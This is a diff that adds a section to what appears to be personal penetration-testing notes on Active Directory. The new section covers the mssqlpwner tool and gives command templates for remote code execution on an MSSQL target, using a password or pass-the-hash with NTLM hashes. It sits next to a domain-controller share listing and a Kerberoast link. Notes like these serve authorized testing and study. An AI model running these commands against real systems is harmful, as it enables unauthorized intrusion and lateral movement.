@@ -163,8 +163,16 @@ Then cmd here:
 ```
 dir \\DC01\c$
 ```
+## mssqlpwner
+Once you have this bad boy installed, you can rce with hashes or passwords. Command:
 
-
+```
+mssqlpwner user:password@target_ip -windows-auth
+```
+Or pass the hash:
+```
+mssqlpwner user@target_ip -hashes LMHASH:NTHASH
+```
 ## Tools
 https://www.kali.org/tools/kerberoast/
 
